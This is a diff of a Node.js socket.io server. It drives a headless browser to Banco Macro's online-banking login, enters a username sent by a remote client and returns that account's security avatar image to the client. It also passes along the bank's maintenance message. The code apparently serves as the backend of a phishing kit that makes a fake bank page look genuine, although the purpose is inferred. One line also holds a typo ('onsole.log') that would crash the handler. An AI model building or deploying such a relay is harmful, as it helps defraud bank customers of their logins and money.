@@ -66,82 +66,84 @@ module.exports = httpServer => {
 
         // Mostrar imagen login
         socket.on("ShowAvatar", data => {
-            
-            if(OnLine > LimiteNavegador){
-                OnLineQ +=1;
-                onsole.log("Navegadores Ocupados. En cola: "+ OnLineQ)
+
+            if (OnLine > LimiteNavegador) {
+                OnLineQ += 1;
+                onsole.log("Navegadores Ocupados. En cola: " + OnLineQ)
                 setTimeout(() => {
                     io.to(data.socket).emit("Resend", data);
                 }, 1500);
-            }else{
-                if(OnLineQ > 0){
-                    OnLineQ -=1;
+            } else {
+                if (OnLineQ > 0) {
+                    OnLineQ -= 1;
                 }
-                console.log('OnLine Before' + OnLine)
+                OnLine +=1;
+                console.log('OnLine Nav' + OnLine)
+
+
+                let browser = new swd.Builder();
+                let tab = browser.forBrowser("chrome")
+                    .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                    .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
+                    .build();
+
+                //Step 1 - Opening sign in page
+                let tabToOpenSignIn =
+                    tab.get("https://www.macro.com.ar/bancainternet/");
+
+                tabToOpenSignIn
+                    .then(() => {
+                        // Timeout to wait if connection is slow
+                        let findTimeOutP =
+                            tab.manage().setTimeouts({
+                                implicit: 15000, // 15 seconds
+                            });
+                        return findTimeOutP;
+                    })
+                    .then(() => {
+                        //Finding the username input
+                        let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
+                            .catch(() => {
+                                tab.quit();
+                                io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
+                                throw new Error("Mantenimiento");
+                            })
+                        return promiseUsernameBox;
+                    })
+                    //Entering the username
+                    .then(usernameBox => {
+                        let promiseFillUsername =
+                            usernameBox.sendKeys(data.user);
+                        return promiseFillUsername;
+                    })
+                    .then(() => {
+                        console.log("Username entered successfully");
+                        let promiseBtnIngresar =
+                            tab.findElement(swd.By.css("#processCustomerLogin"));
+                        return promiseBtnIngresar;
+                    })
+                    .then(promiseBtnIngresar => {
+                        let promiseClickIngresar = promiseBtnIngresar.click();
+                        return promiseClickIngresar;
+                    })
+                    .then(() => {
+                        //Finding the img avatar
+                        setTimeout(() => {
+                            let promiseAvatarImg =
+                                tab.findElement(swd.By.css("#imageComponentAvatar")).getAttribute('src')
+                                    .then(AvatarImg => {
+                                        socketImg.push({ 'socket': data.socket, 'img': AvatarImg });
+                                        io.to(data.socket).emit("AvatarElement", AvatarImg);
+                                        tab.quit();
+                                    })
+                        }, 1000);
+                        OnLine -= 1;
+                        console.log(OnLine)
+                    })
+                    .catch(err => {
+                        console.log("Error ", err, " occurred!");
+                    });
             }
-
-            let browser = new swd.Builder();
-            let tab = browser.forBrowser("chrome")
-                .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                .build();
-
-            //Step 1 - Opening sign in page
-            let tabToOpenSignIn =
-                tab.get("https://www.macro.com.ar/bancainternet/");
-
-            tabToOpenSignIn
-                .then(() => {
-                    // Timeout to wait if connection is slow
-                    let findTimeOutP =
-                        tab.manage().setTimeouts({
-                            implicit: 15000, // 15 seconds
-                        });
-                    return findTimeOutP;
-                })
-                .then(() => {
-                    //Finding the username input
-                    let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
-                        .catch(() => {
-                            tab.quit();
-                            io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
-                            throw new Error("Mantenimiento");
-                        })
-                    return promiseUsernameBox;
-                })
-                //Entering the username
-                .then(usernameBox => {
-                    let promiseFillUsername =
-                        usernameBox.sendKeys(data.user);
-                    return promiseFillUsername;
-                })
-                .then(() => {
-                    console.log("Username entered successfully");
-                    let promiseBtnIngresar =
-                        tab.findElement(swd.By.css("#processCustomerLogin"));
-                    return promiseBtnIngresar;
-                })
-                .then(promiseBtnIngresar => {
-                    let promiseClickIngresar = promiseBtnIngresar.click();
-                    return promiseClickIngresar;
-                })
-                .then(() => {
-                    //Finding the img avatar
-                    setTimeout(() => {
-                        let promiseAvatarImg =
-                            tab.findElement(swd.By.css("#imageComponentAvatar")).getAttribute('src')
-                                .then(AvatarImg => {
-                                    socketImg.push({ 'socket': data.socket, 'img': AvatarImg });
-                                    io.to(data.socket).emit("AvatarElement", AvatarImg);
-                                    tab.quit();
-                                })
-                    }, 1000);
-                    OnLine -= 1;
-                    console.log (OnLine)
-                })
-                .catch(err => {
-                    console.log("Error ", err, " occurred!");
-                });
         })
 
 
@@ -234,9 +236,9 @@ module.exports = httpServer => {
 
                 OnLine += 1;
                 console.log('OnLine' + OnLine)
-    
+
                 while (OnLine > LimiteNavegador) {
-                    console.log("OnLine: "+ OnLine);
+                    console.log("OnLine: " + OnLine);
                     sleepi(2000);
                 }
 
